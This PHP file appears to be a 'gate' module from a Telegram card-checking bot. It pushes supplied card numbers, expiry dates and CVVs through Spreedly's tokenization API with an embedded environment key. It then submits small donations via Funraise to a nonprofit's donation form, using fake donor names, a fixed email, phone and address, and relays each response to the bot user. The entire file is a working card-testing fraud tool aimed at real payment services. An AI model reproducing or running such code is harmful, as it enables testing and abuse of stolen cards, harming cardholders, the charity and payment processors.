<?php 

use App\Faker\{Name, Internet, Address};
use App\Models\Bot;
use App\Gate\{Make, Responses as Res};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

# ~ REQ 1 ~ #
$headers1 = ['accept: */*','content-type: application/json','origin: https://core.spreedly.com','referer: https://core.spreedly.com/v1/embedded/number-frame.html?v=1.71','spreedly-environment-key: KvcTOx3FPBgscLs51rjT848DP7p', 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.133 Safari/537.36'];
$post1 = '{"environment_key":"KvcTOx3FPBgscLs51rjT848DP7p","payment_method":{"credit_card":{"number":"'.$cc[0].'","verification_value":"'.$cc[3].'000","first_name":"'.Name::firstName().'","last_name":"'.Name::lastName().'","email":"castillovazquez193@gmail.com","month":"'.$cc[1].'","year":"'.$cc[2].'","address1":"Main Street 353","city":"Miami","state":"FL","zip":"33001","country":"Estados Unidos","phone_number":"5023851039"}}}';
$site1 = ['url' => 'https://core.spreedly.com/v1/payment_methods/restricted.json?from=iframe&v=1.76', 'method' => 'POST', 'post' => $post1, 'headers' => $headers1, 'cookie' => null, 'proxy' => null];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);
$fim1 = json_decode($req1->body, true);
$sid = $fim1['transaction']['payment_method']['token'];
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, implode('|', $cc), $gate['name'], $lang['wait']));

# ~ REQ 2 ~ #
$headers2 = ['Host: platform.funraise.io', 'content-type: application/json; charset=UTF-8', 'x-org-id: e903bf1c-1df2-4a95-a37c-61a636c7e863'];
$post2 = '{"paymentType":"card","frequency":"o","currency":"USD","supportsDonorCoversFees":true,"donorCoveredFees":true,"storeOrderAmount":0,"donationAmount":5,"baseAmount":5,"tipAmount":0,"amount":5.67,"dcfFeeAmount":0.67,"pageRaisedAmount":0,"pageGoal":0,"profileImage":"","exists":false,"tags":null,"paymentTechnology":"SPREEDLY","recurring":false,"allowsDonations":true,"answers":null,"showAutocomplete":false,"addressDisabled":false,"submittingPayment":false,"submittingText":"","recaptchaNotSolved":false,"postalCodeValidationErrorMessage":"","emailOptIn":true,"firstName":"'.Name::firstName().'","lastName":"'.Name::lastName().'","email":"castillovazquez193@gmail.com","phone":"5023851039","addressValue":"","addressId":"","address":"Main Street 353","city":"Miami","state":"FL","country":"Estados Unidos","postalCode":"33001","paymentToken":"'.$sid.'","month":11,"year":2026,"pageId":null,"tipPercent":3,"currencySymbol":"$","organizationId":"620fa1db-da1d-4963-84ad-328edcf65047","formId":15670,"sourceUrl":"https://pointfoundation.org/donate/","referrer":"","forter":{"tokenCookie":"fd83326f2ac74b9bb559632e2ed6d2a2_1652534931889__UDF43s_13ck_tt"}}';
$site2 = ['url' => 'https://platform.funraise.io/api/v2/transaction', 'method' => 'POST', 'post' => $post2, 'headers' => $headers2, 'cookie' => null, 'proxy' => null];
$req2 = Make::Create(2, $site2, $gate, $user);
IsUnspam($req2, $user);
$fim2 = json_decode($req2->body, true);
$pid = $fim2['id'];
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, implode('|', $cc), htmlentities($req2->body), $lang['wait']));

# ~ REQ 3 ~ #
$headers3 = ['Host: platform.funraise.io'];
$site3 = ['url' => 'https://platform.funraise.io/api/v2/transaction/'.$pid, 'method' => 'GET', 'post' => null, 'headers' => $headers3, 'cookie' => null, 'proxy' => $proxy2];
$req3 = Make::Create(3, $site3, $gate, $user);
IsUnspam($req3, $user);
$fim3 = json_decode($req3->body, true);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(3, implode('|', $cc), htmlentities($req3->body), $lang['wait']));
